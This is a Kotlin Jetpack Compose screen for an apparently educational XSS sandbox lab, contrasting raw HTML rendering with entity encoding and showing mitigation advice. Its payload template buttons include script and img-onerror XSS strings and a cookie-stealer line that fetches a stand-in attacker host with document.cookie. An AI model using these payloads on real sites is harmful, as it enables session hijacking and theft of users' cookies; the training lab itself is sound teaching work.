package com.example.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.ExperimentalLayoutApi
import androidx.compose.foundation.layout.FlowRow
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Code
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Surface
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.sandbox.XssEngine
import com.example.ui.components.FlagBadge
import com.example.ui.components.SandboxBanner
import com.example.ui.components.TerminalWindow
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberGreen
import com.example.ui.theme.CyberNavyBorder
import com.example.ui.theme.CyberNavyCard
import com.example.ui.theme.CyberNavyDark
import com.example.ui.theme.CyberNavySurface
import com.example.ui.theme.CyberTextPrimary
import com.example.ui.theme.CyberTextSecondary
import com.example.ui.theme.CyberThreatRed
import com.example.ui.theme.CyberWarningYellow
import com.example.viewmodel.UiLabState

@OptIn(ExperimentalLayoutApi::class)
@Composable
fun XssLabScreen(
    state: UiLabState,
    onInputChange: (String) -> Unit,
    onToggleSanitized: (Boolean) -> Unit,
    onEvaluate: () -> Unit,
    onDismissAlert: () -> Unit,
    modifier: Modifier = Modifier
) {
    val result = state.xssResult

    // Simulated Browser Alert Dialog
    if (state.xssSimulatedAlert != null) {
        AlertDialog(
            onDismissRequest = onDismissAlert,
            title = {
                Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Icon(Icons.Default.Warning, contentDescription = "Alert", tint = CyberThreatRed)
                    Text("Simulated JavaScript Alert (DOM Execution)")
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                    Text(
                        text = state.xssSimulatedAlert,
                        style = MaterialTheme.typography.bodyMedium.copy(
                            color = CyberThreatRed,
                            fontWeight = FontWeight.Bold,
                            fontFamily = FontFamily.Monospace
                        )
                    )
                    Text(
                        text = "In a live browser, this dialog proves arbitrary script execution occurred within the victim's authenticated origin.",
                        style = MaterialTheme.typography.bodySmall.copy(color = CyberTextSecondary)
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = onDismissAlert,
                    colors = ButtonDefaults.buttonColors(containerColor = CyberCyan, contentColor = CyberNavyDark),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text("OK (Dismiss)")
                }
            },
            containerColor = CyberNavySurface,
            textContentColor = CyberTextPrimary
        )
    }

    LazyColumn(
        modifier = modifier
            .fillMaxSize()
            .testTag("xss_lab_screen")
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        item {
            SandboxBanner(
                title = "CROSS-SITE SCRIPTING (XSS) SANDBOX",
                subtitle = "Simulates browser DOM sinks • Demonstrates context HTML entity sanitization"
            )
        }

        item {
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(14.dp),
                colors = CardDefaults.cardColors(containerColor = CyberNavySurface),
                border = androidx.compose.foundation.BorderStroke(1.dp, CyberNavyBorder)
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Icon(Icons.Default.Code, contentDescription = "XSS", tint = CyberCyan)
                        Text(
                            text = "Lab 2: Cross-Site Scripting (Stored & Reflected)",
                            style = MaterialTheme.typography.titleMedium.copy(
                                color = CyberTextPrimary,
                                fontWeight = FontWeight.Bold
                            )
                        )
                    }
                    Text(
                        text = "Objective: Inject test payloads into the Presidency Student Message Board. Contrast raw browser DOM execution with HTML entity encoding that converts < to &lt; and > to &gt;, neutralizing malicious tags.",
                        style = MaterialTheme.typography.bodySmall.copy(color = CyberTextSecondary)
                    )
                }
            }
        }

        // Flag if solved
        if (result?.flagUnlocked != null || state.capturedFlags.any { it.contains("XSS") }) {
            item {
                val flag = result?.flagUnlocked ?: state.capturedFlags.first { it.contains("XSS") }
                FlagBadge(flag = flag)
            }
        }

        // Interactive Comment Box
        item {
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = CyberNavySurface),
                border = androidx.compose.foundation.BorderStroke(1.dp, CyberCyan.copy(alpha = 0.3f))
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(14.dp)
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "Presidency Forum Input Sink",
                            style = MaterialTheme.typography.titleSmall.copy(
                                color = CyberCyan,
                                fontWeight = FontWeight.Bold
                            )
                        )

                        // Sanitized toggle
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Text(
                                text = if (state.xssSanitizedMode) "HTML Encoded (Safe)" else "Raw HTML (Vuln)",
                                style = MaterialTheme.typography.labelSmall.copy(
                                    color = if (state.xssSanitizedMode) CyberGreen else CyberThreatRed,
                                    fontWeight = FontWeight.Bold
                                )
                            )
                            Switch(
                                checked = state.xssSanitizedMode,
                                onCheckedChange = onToggleSanitized,
                                colors = SwitchDefaults.colors(
                                    checkedThumbColor = CyberNavyDark,
                                    checkedTrackColor = CyberGreen,
                                    uncheckedThumbColor = CyberNavyDark,
                                    uncheckedTrackColor = CyberThreatRed
                                ),
                                modifier = Modifier.testTag("xss_sanitized_mode_switch")
                            )
                        }
                    }

                    // Preset Chips
                    Text(
                        text = "PAYLOAD TEMPLATES",
                        style = MaterialTheme.typography.labelSmall.copy(
                            color = CyberTextSecondary,
                            fontWeight = FontWeight.Bold
                        )
                    )
                    FlowRow(
                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        PayloadChip(
                            label = "<script>alert('XSS')</script>",
                            onClick = { onInputChange("<script>alert('Presidency University XSS Alert')</script>") }
                        )
                        PayloadChip(
                            label = "Cookie Stealer: <script>document.cookie</script>",
                            onClick = { onInputChange("<script>fetch('http://attacker.local?c=' + document.cookie)</script>") }
                        )
                        PayloadChip(
                            label = "<img src=x onerror=...>",
                            onClick = { onInputChange("<img src=x onerror=\"alert('Injected Image Error')\">") }
                        )
                        PayloadChip(
                            label = "Benign Hello",
                            onClick = { onInputChange("Hello fellow club members! Great workshop!") }
                        )
                    }

                    OutlinedTextField(
                        value = state.xssInput,
                        onValueChange = onInputChange,
                        label = { Text("Forum Post Body / HTML Sink") },
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("xss_input_field"),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = CyberCyan,
                            unfocusedBorderColor = CyberNavyBorder,
                            focusedTextColor = CyberTextPrimary,
                            unfocusedTextColor = CyberTextPrimary
                        ),
                        maxLines = 3
                    )

                    Button(
                        onClick = onEvaluate,
                        colors = ButtonDefaults.buttonColors(containerColor = CyberCyan, contentColor = CyberNavyDark),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("xss_post_button")
                    ) {
                        Icon(Icons.Default.PlayArrow, contentDescription = "Post")
                        Spacer(modifier = Modifier.width(6.dp))
                        Text("Post to Sandbox DOM Sink", fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        // Mock Browser Viewport
        item {
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(14.dp),
                colors = CardDefaults.cardColors(containerColor = CyberNavyDark),
                border = androidx.compose.foundation.BorderStroke(1.dp, CyberNavyBorder)
            ) {
                Column {
                    // Browser address bar
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(Color(0xFF0F172A))
                            .padding(horizontal = 12.dp, vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Box(modifier = Modifier.size(8.dp).clip(CircleShape).background(CyberThreatRed))
                        Box(modifier = Modifier.size(8.dp).clip(CircleShape).background(CyberWarningYellow))
                        Box(modifier = Modifier.size(8.dp).clip(CircleShape).background(CyberGreen))
                        Spacer(modifier = Modifier.width(4.dp))
                        Surface(
                            shape = RoundedCornerShape(6.dp),
                            color = CyberNavyCard,
                            modifier = Modifier.weight(1f)
                        ) {
                            Text(
                                text = "https://forum.presidency.edu/post?id=2026",
                                modifier = Modifier.padding(horizontal = 10.dp, vertical = 4.dp),
                                style = MaterialTheme.typography.bodySmall.copy(
                                    color = CyberTextSecondary,
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 11.sp
                                )
                            )
                        }
                    }

                    // Rendered Content
                    Column(
                        modifier = Modifier.padding(16.dp),
                        verticalArrangement = Arrangement.spacedBy(10.dp)
                    ) {
                        Text(
                            text = "Presidency University Student Forum",
                            style = MaterialTheme.typography.titleSmall.copy(color = CyberTextPrimary, fontWeight = FontWeight.Bold)
                        )

                        // Default benign post
                        Surface(
                            shape = RoundedCornerShape(8.dp),
                            color = CyberNavySurface,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Text(
                                    text = "Sakilur (Club Secretary)",
                                    style = MaterialTheme.typography.labelSmall.copy(color = CyberCyan, fontWeight = FontWeight.Bold)
                                )
                                Text(
                                    text = "Welcome to the Cyber Security club workshop! Ensure you test all sandboxes safely.",
                                    style = MaterialTheme.typography.bodySmall.copy(color = CyberTextPrimary)
                                )
                            }
                        }

                        // User Rendered Post
                        if (result != null) {
                            Surface(
                                shape = RoundedCornerShape(8.dp),
                                color = if (result.isScriptTriggered) CyberThreatRed.copy(alpha = 0.1f) else CyberNavySurface,
                                border = androidx.compose.foundation.BorderStroke(
                                    1.dp,
                                    if (result.isScriptTriggered) CyberThreatRed else CyberGreen
                                ),
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Column(modifier = Modifier.padding(10.dp)) {
                                    Row(
                                        modifier = Modifier.fillMaxWidth(),
                                        horizontalArrangement = Arrangement.SpaceBetween
                                    ) {
                                        Text(
                                            text = "You (Test Student)",
                                            style = MaterialTheme.typography.labelSmall.copy(
                                                color = if (result.isScriptTriggered) CyberThreatRed else CyberGreen,
                                                fontWeight = FontWeight.Bold
                                            )
                                        )
                                        Text(
                                            text = if (result.isScriptTriggered) "SCRIPT EXECUTED" else "SAFE RENDER",
                                            style = MaterialTheme.typography.labelSmall.copy(
                                                color = if (result.isScriptTriggered) CyberThreatRed else CyberGreen,
                                                fontWeight = FontWeight.Bold,
                                                fontSize = 9.sp
                                            )
                                        )
                                    }
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(
                                        text = result.renderedHtml,
                                        style = MaterialTheme.typography.bodySmall.copy(
                                            color = CyberTextPrimary,
                                            fontFamily = FontFamily.Monospace
                                        )
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }

        // Diagnostics & Stolen Cookie Indicator
        if (result != null) {
            item {
                if (result.isCookieExfiltrated && result.simulatedExfiltratedCookie != null) {
                    Surface(
                        shape = RoundedCornerShape(10.dp),
                        color = CyberThreatRed.copy(alpha = 0.15f),
                        border = androidx.compose.foundation.BorderStroke(1.dp, CyberThreatRed)
                    ) {
                        Row(
                            modifier = Modifier.padding(12.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Icon(Icons.Default.Warning, contentDescription = "Exfiltrated", tint = CyberThreatRed)
                            Column {
                                Text(
                                    text = "SESSION HIJACKING VECTOR EXPLOITED!",
                                    style = MaterialTheme.typography.labelMedium.copy(color = CyberThreatRed, fontWeight = FontWeight.Bold)
                                )
                                Text(
                                    text = "Attacker exfiltrated: ${result.simulatedExfiltratedCookie}",
                                    style = MaterialTheme.typography.bodySmall.copy(
                                        color = CyberTextPrimary,
                                        fontFamily = FontFamily.Monospace,
                                        fontSize = 10.sp
                                    )
                                )
                                Text(
                                    text = "Mitigation: Set 'HttpOnly' flag on cookies and implement strict Content-Security-Policy (CSP).",
                                    style = MaterialTheme.typography.bodySmall.copy(color = CyberWarningYellow, fontSize = 11.sp)
                                )
                            }
                        }
                    }
                } else {
                    TerminalWindow(
                        title = "DOM Sanitization Inspector",
                        content = result.sanitizationNote,
                        tintColor = if (state.xssSanitizedMode) CyberGreen else CyberTextSecondary
                    )
                }
            }
        }
    }
}
